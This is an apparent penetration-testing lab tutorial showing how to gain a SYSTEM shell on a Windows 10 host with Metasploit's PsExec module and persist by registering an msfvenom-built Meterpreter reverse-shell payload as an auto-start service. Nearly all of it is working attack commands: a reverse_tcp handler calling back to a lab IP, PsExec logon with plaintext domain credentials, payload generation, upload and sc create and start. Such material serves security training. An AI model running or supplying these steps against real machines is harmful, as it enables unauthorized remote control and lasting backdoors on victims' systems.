```markdown
# Windows Persistence Demo

To demonstrate persistence using malicious services, let's use `msfvenom` to generate a Meterpreter payload, transport it to the Windows machine, and register a service using it.

> This requires an **active shell as SYSTEM** on the Windows 10 machine.  
> The first six steps detail how to open a Meterpreter shell on the Windows 10 machine if you do not have an active session already.

---

### 1. Start Metasploit on Kali

Open a terminal in Kali and start Metasploit with:

```bash
msfconsole
```

> 💡 **Note:** If Metasploit is already running, kill any background jobs:
```bash
jobs -K
```

---

### 2. Load Multi/Handler

```bash
use exploit/multi/handler
```

Then set the handler options:

```bash
set LHOST 172.22.117.100
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run -j
```

---

### 3. Use PsExec for Remote Access

Load the PsExec module:

```bash
use exploit/windows/smb/psexec
```

Set the following options:

```bash
set RHOST 172.22.117.20
set SMBUser tstark
set SMBPass Password!
set SMBDomain megacorpone
```

Run the module:

```bash
run
```

> ✅ You should now have a Meterpreter shell as SYSTEM.

> ℹ️ **Note:** We'll explore PsExec in more detail later. It's a method for remote Windows administration, and there's a Metasploit module that automates it.

---

### 4. Generate Meterpreter Payload with msfvenom

In a new terminal, generate a service-compatible payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe-service > service.exe
```

> ⚠️ The format **must be `exe-service`** and not just `exe`. Service Manager expects a different binary format than regular executables.

---

### 5. Upload Payload to Windows

From the Meterpreter shell:

```bash
cd ../../../
upload service.exe
```

---

### 6. Create a Windows Service for Persistence

Enter a command shell within Meterpreter:

```bash
shell
```

Then create the malicious service:

```bash
sc create TestService binPath= "C:\service.exe" start= auto
```

> 🔧 `sc` (Service Control) is used to manage Windows services.  
> You just created a new service that runs the payload and starts on login.

> ✅ **Important:** Use double quotes (`"`) around the path, not single quotes.

---

### 7. Start the Service

```bash
sc start TestService
```

You should now get a **new Meterpreter session** as the payload runs!

---

### 8. Next: Persistence Using Scheduled Tasks

You will now perform another persistence technique by creating a **scheduled task** that executes a payload at a defined interval.
```
